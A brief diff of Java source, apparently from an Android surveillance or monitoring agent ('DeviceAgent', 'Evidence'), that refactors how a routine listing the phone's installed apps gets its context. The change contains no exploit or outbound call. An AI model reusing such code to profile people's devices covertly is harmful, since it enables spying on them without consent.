@@ -26,6 +26,7 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.RCSAndroidGUI;
+import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Utils;
 import com.ht.RCSAndroidGUI.utils.WChar;
 
@@ -184,7 +185,7 @@ public class DeviceAgent extends AgentBase {
 
 	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
 	    ArrayList<PInfo> res = new ArrayList<PInfo>();   
-	    PackageManager packageManager = RCSAndroidGUI.getAppContext().getPackageManager();
+	    PackageManager packageManager = Status.getAppContext().getPackageManager();
 	    
 	    List<PackageInfo> packs = packageManager.getInstalledPackages(0);
 	    for(int i=0;i<packs.size();i++) {
